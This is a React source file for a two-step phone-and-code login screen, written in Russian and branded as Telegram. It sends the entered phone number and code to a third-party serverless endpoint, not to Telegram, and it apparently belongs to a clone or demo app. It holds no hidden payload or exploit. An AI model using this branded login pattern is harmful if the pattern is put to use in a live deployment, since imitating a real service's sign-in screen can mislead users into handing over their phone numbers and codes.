import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToast } from '@/hooks/use-toast';
import Icon from '@/components/ui/icon';

const AUTH_API = 'https://functions.poehali.dev/c9a0277e-ae62-4e24-a830-16d46d176b38';

interface AuthScreenProps {
  onAuthSuccess: (phone: string) => void;
}

export default function AuthScreen({ onAuthSuccess }: AuthScreenProps) {
  const [step, setStep] = useState<'phone' | 'code'>('phone');
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    try {
      const response = await fetch(AUTH_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'send_code', phone })
      });
      
      const data = await response.json();
      
      if (data.success) {
        toast({
          title: 'Код отправлен',
          description: data.message
        });
        setStep('code');
      }
    } catch (error) {
      toast({
        title: 'Ошибка',
        description: 'Не удалось отправить код',
        variant: 'destructive'
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    try {
      const response = await fetch(AUTH_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'verify_code', phone, code })
      });
      
      const data = await response.json();
      
      if (data.verified) {
        toast({
          title: 'Успешно!',
          description: 'Добро пожаловать в Telegram'
        });
        onAuthSuccess(phone);
      } else {
        toast({
          title: 'Ошибка',
          description: 'Неверный код',
          variant: 'destructive'
        });
      }
    } catch (error) {
      toast({
        title: 'Ошибка',
        description: 'Не удалось проверить код',
        variant: 'destructive'
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full h-screen flex items-center justify-center bg-background">
      <div className="w-full max-w-md px-8">
        <div className="text-center mb-8">
          <div className="w-32 h-32 mx-auto mb-6 bg-primary rounded-full flex items-center justify-center">
            <Icon name="Send" size={64} className="text-primary-foreground" />
          </div>
          <h1 className="text-3xl font-medium mb-2">Telegram</h1>
          <p className="text-muted-foreground">
            {step === 'phone' 
              ? 'Пожалуйста, введите номер телефона' 
              : 'Введите код, который мы отправили'}
          </p>
        </div>

        {step === 'phone' ? (
          <form onSubmit={handlePhoneSubmit} className="space-y-4">
            <div>
              <Input
                type="tel"
                placeholder="+7 (___) ___-__-__"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="h-12 text-center text-lg bg-card border-border"
                autoFocus
              />
            </div>
            <Button 
              type="submit" 
              className="w-full h-12 bg-primary hover:bg-primary/90"
              disabled={loading || phone.length < 10}
            >
              {loading ? 'Отправка...' : 'Далее'}
            </Button>
          </form>
        ) : (
          <form onSubmit={handleCodeSubmit} className="space-y-4">
            <div>
              <Input
                type="text"
                placeholder="Код"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="h-12 text-center text-lg bg-card border-border tracking-widest"
                maxLength={5}
                autoFocus
              />
            </div>
            <Button 
              type="submit" 
              className="w-full h-12 bg-primary hover:bg-primary/90"
              disabled={loading || code.length < 5}
            >
              {loading ? 'Проверка...' : 'Войти'}
            </Button>
            <Button
              type="button"
              variant="ghost"
              className="w-full"
              onClick={() => setStep('phone')}
            >
              Изменить номер
            </Button>
          </form>
        )}
      </div>
    </div>
  );
}